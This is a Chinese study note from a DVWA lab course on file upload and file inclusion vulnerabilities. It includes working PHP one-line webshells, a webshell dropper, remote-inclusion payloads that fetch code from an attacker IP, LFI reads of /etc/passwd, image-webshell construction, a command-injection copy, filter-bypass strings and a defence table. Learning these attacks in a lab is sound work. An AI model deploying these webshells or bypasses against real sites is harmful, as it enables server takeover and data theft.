Web 安全：文件上传与文件包含

Web 安全 2026-08-28 4617 字 约 12 分钟

来源：课程实验《文件上传与包含攻击》（DVWA 平台 + 中国蚁剑，2025-2026 第二学期），以课件详细版（18 页实验指导）为主
定位：GetShell（拿到服务器权限）最经典的两条链路，护网/红队/CTF 高频考点，面试必问
实战场景：一切有上传功能的站点（头像、附件、编辑器）；一切带 page=、file=、template= 参数的页面

一、原理概述

文件上传漏洞：信任了不该信任的东西

一句话原理：文件上传功能把用户上传的文件直接存进 Web 可访问目录，且不校验文件内容。PHP/JSP 等可执行文件一进入 Web 目录，攻击者访问它，服务器就按"程序"解析执行——一个 webshell（网页后门）就此诞生。

为什么能执行：Web 服务器的职责是"收到 HTTP 请求 → 按扩展名和路径决定是返回静态内容还是执行脚本"。.php 文件落在 Web 根目录内 → 服务器执行它 → 里面的 PHP 代码就是攻击者写在文件里的代码。上传功能等于"帮攻击者把代码放到了能执行它的地方"。

文件包含漏洞：include 把参数当文件

一句话原理：后端用 include($file) 之类的方式动态加载文件，而 $file 来自用户参数（如 ?page=xxx）。包含进来文件里的 PHP 代码会被无条件执行，纯文本会被原样输出。

为什么危险（包含点 + 可控参数 = 漏洞）：
- 本地包含 LFI：?page=../../etc/passwd → 读到服务器任意文件；file:// 协议读文件
- 远程包含 RFI：?page=http://攻击者IP/evil.txt → 服务器去远程把文件拉回来执行，等于远程投递 webshell
- 伪协议：php://filter 不执行只读源码、data:// 直接内联代码——把"不可能上传文件"变成"不落地执行代码"

二、核心知识

一句话木马与蚁剑（实验核心工具链）

<?php @eval($_POST['file']) ?>
<?php @assert($_POST['file']) ?>          <!-- 过 WAF 变体 -->
<?php fputs(fopen('evil.php','w'),"<?php @eval(\$_POST['file']);?>"); ?>  <!-- 自写马 -->

原理：eval() 把 POST 参数 file 的值当作 PHP 代码执行。蚁剑（AntSword）连接时：右键添加数据 → URL 填木马地址（如 http://IP/DVWA/hackable/uploads/ws.php）→ 密码填 file → 连接。此后蚁剑界面上的每个操作（看文件、执行命令）都被转换成 POST 请求发给木马，由服务器上的 PHP 执行。木马是"窗口"，蚁剑是"操作员"。

校验点 Low Medium High Impossible
扩展名 不查 不查 白名单 jpg/jpeg/png 白名单 + 随机重命名
MIME/Content-Type 不查 查 image/jpeg/image/png 不查 查
文件头 getimagesize 不查 不查 查 查
内容 不查 不查 不查 图片重编码（剥壳）
CSRF token 无 无 无 有

文件包含方式速查

形式 示例 效果
远程包含 ?page=http://攻击者IP/evil.txt 服务器拉远程文件并执行（需 allow_url_include=On）
本地包含 ?page=../../../../etc/passwd 读取本地任意文件（PHP 代码则执行）
file 协议 ?page=file:///etc/passwd 强制按文件读，绕过 HTTP 限制
伪协议 ?page=php://filter/convert.base64-encode/resource=index.php 不执行直接读源码（base64 输出）

三、实操/利用流程（方法论）

文件上传拿 Shell 四步

  1. 探测：随便传一个 .php 测试文件，看是否上传成功、被存到哪里（响应会回显路径）
  2. 投毒：上传一句话木马（替换内容再传）
  3. 连接：蚁剑添加数据连接木马 URL
  4. 站稳：文件管理 → 读敏感文件（/etc/passwd、配置文件）、命令执行 → 找提权点

文件包含拿 Shell 四步（RFI 思路）

  1. 发现包含点：URL 出现 ?page=file1.php 这类参数 → 参数可换 = 可控
  2. 准备恶意文件：在攻击者自己的服务器上放一个 .txt（后缀不能是 .php，否则被攻击者服务器先执行了），内容为写马代码：<?php fputs(fopen('evil.php','w'),"<?php @eval(\$_POST['file']);?>");?>
  3. 触发：?page=http://攻击者IP/remotefileinclusion.txt → 目标服务器拉回该文件执行 → 在目标路径下生成 evil.php
  4. 连接：蚁剑连接 evil.php。写目录没有权限时，改写到 hackable/uploads/ 这类已知可写目录

四、绕过与进阶（DVWA 各级别）

上传：Medium —— 只查客户端报的类型

后端校验 $_FILES['uploaded']['type'] 必须是 jpeg/png。这是客户端告诉服务器的内容，抓包就能改：Burp 拦截上传请求 → 把 Content-Type: application/x-php 改成 image/png → 放行 → 上传成功。教训：type 字段是"客户端申报值"，永远不可信，必须由服务端自己检测内容。

上传：High —— 扩展名白名单 + 文件头校验

  • 校验点变成：文件名的最后一个扩展名必须是 jpg/jpeg/png 且 getimagesize() 能读出图片信息（读不到就报错）
  • 图片马制作（把木马"藏"进图片）：
  • Linux：cat a.png a.php > b.png（两个文件按二进制拼接）
  • Windows CMD：copy a.png/b + a.php/a b.png（/b 二进制 /a 文本）
  • 上传 b.png 成功，但蚁剑连不上——因为.png 扩展名让服务器把它当图片返回，不是当 PHP 执行
  • 两条激活路径（把"图片"变成"程序"）：
    1. 命令注入配合：利用之前实验的命令注入，127.0.0.1;cp ../../hackable/uploads/b.png ../../hackable/uploads/b.php 复制出 .php 副本 → 可连接
    2. 文件包含配合：?page=file:///var/www/html/DVWA/hackable/uploads/b.png 强制按 PHP 解析执行 → 蚁剑连接时（浏览器 F12 复制 Cookie 带上）成功
  • 本质：每一种校验都能被组合拳绕过——扩展名卡住了就改内容，内容卡住了就找执行入口。上传漏洞往往是"上传+包含/命令注入"多漏洞组合利用。

包含：Medium —— str_replace 双写绕过

过滤 http://、https://、../、..\，但 str_replace 是一次性的无状态替换：

htthttp://p:// → 替换 http:// 后剩 p:// → 拼起来恰好 htt[p://]...

构造 ?page=htthttp://p://目标IP/evil.txt —— 过滤吃掉中间的 http://，剩下的 http:// 原样生效。目录穿越同理：....// → 吃掉中间的 ../ → 剩 ../。黑名单替换天然可被"双写"破，这是 str_replace 系过滤的通用死穴。

包含：High —— fnmatch 白名单，RFI 死路转 LFI

!fnmatch("file*", $file) 要求参数必须以 file 开头 → 远程包含彻底堵死。但本地包含仍然成立：

?page=file:///etc/passwd              → 读系统文件
?page=file:/../../../phpinfo.php      → 相对当前目录（fi/ 下）穿越到 phpinfo.php

LFI 永远比 RFI 难防：不需要远程服务器，一个 file:// 就能读服务器任意文件。

Impossible：为什么防住了

扩展名白名单 + 大小/类型/文件头全查 + md5(uniqid()) 随机重命名（攻击者无法预测存储路径）+ 图片重编码（把图片用 GD 库重新生成，木马内容被剥离）+ Anti-CSRF token。链路上每一个环节都断掉，这才是纵深防御的样子。

五、防御（面试必答，对应原理）

攻击点 防御 对应原理
可执行文件入库 扩展名白名单 + 随机化存储文件名（md5/时间戳，不保留原名） 从源头排除脚本扩展名；路径不可预测，即使传上去也无法定位
内容伪造 服务端检测：getimagesize() + 图片重编码（重新生成图片剥壳） 不信任客户端申报的 type，实际解析文件内容
脚本被执行 上传目录禁止执行脚本（.htaccess 禁 php、Nginx location ~ \.php 排除 uploads） Web 服务器层面切断"执行"这一环
包含任意文件 白名单文件列表（只能包含指定的几个文件） 最优解：根本不让参数决定包含谁
远程包含 allow_url_include=Off（php.ini） 关闭 HTTP 拉取文件的能力
任意文件读取 open_basedir 限制 PHP 可访问目录范围 即使 LFI 成功，也读不出目录外文件
权限 Web 目录最小写权限；上传目录与被包含目录分离编剧 降低被写马、被读取的面

六、面试速答卡

  • 上传漏洞的本质：可执行文件被放进 Web 可访问目录且无内容校验
  • 一句话木马原理：eval($_POST['file']) 把 POST 内容当 PHP 代码执行
  • MIME 校验为什么能绕过：Content-Type 是客户端申报值，抓包随便改
  • 图片马怎么做：cat 图片 木马 > 新图片，文件头是图片但尾部有代码；用包含/命令注入激活
  • LFI 和 RFI 区别：包含本地文件 vs 包含远程 URL 文件；RFI 需 allow_url_include，LFI 更常见
  • str_replace 绕过：双写 htthttp://p://、....//，替换后重新拼接成合法内容
  • 包含漏洞拿 Shell 的链：写马 txt（远程）→ RFI 触发生成 php → 蚁剑连接
  • 最有效防御：白名单 + 随机重命名 + 上传目录禁执行 + 包含白名单列表
